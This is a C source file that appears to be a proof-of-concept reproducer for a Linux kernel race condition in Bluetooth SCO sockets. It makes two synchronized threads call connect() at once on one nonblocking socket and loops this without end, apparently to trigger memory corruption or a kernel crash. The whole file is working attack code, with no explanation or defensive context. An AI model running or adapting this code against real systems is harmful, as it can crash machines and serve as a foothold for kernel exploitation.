#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <sched.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/sco.h>

#define NR_SETSOCKOPT_TH	2

int fd;
pthread_barrier_t setsockopt_barrier;

void *connect1(void *arg){
	struct sockaddr_sco sa;
	int i, ret;
	for(i = 0; i < 6; i++)
		sa.sco_bdaddr.b[i] = 0;
	sa.sco_family = AF_BLUETOOTH;
	ret = pthread_barrier_wait(&setsockopt_barrier);
	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		printf("pthread_barrier_wait in connect1\n");
		return NULL;
	}
	connect(fd, (struct sockaddr *)&sa, sizeof(sa));
}

void *connect2(void *arg){
	struct sockaddr_sco sa;
	int i, ret;
	for(i = 0; i < 6; i++)
		sa.sco_bdaddr.b[i] = 0xff;
	sa.sco_family = AF_BLUETOOTH;
	ret = pthread_barrier_wait(&setsockopt_barrier);
	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		printf("pthread_barrier_wait in connect1\n");
		return NULL;
	}
	connect(fd, (struct sockaddr *)&sa, sizeof(sa));
}

void race(){
	pthread_t t2, t3;

	fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET | SOCK_NONBLOCK , BTPROTO_SCO);
        if(fd < 0){
                perror("create sco socket failed\n");
                exit(-1);
        }

	if(pthread_barrier_init(&setsockopt_barrier, NULL, NR_SETSOCKOPT_TH) != 0){
		printf("pthread_barrier_init setsockopt failed\n");
		exit(-1);
	}

	pthread_create(&t2, NULL, connect1, NULL);
	pthread_create(&t3, NULL, connect2, NULL);

	pthread_join(t2, NULL);
	pthread_join(t3, NULL);

	close(fd);
}

int main(){
	int i = 0;

	while(1){
		printf("round %d\n", i++);
		race();	
	}

	return 0;
}
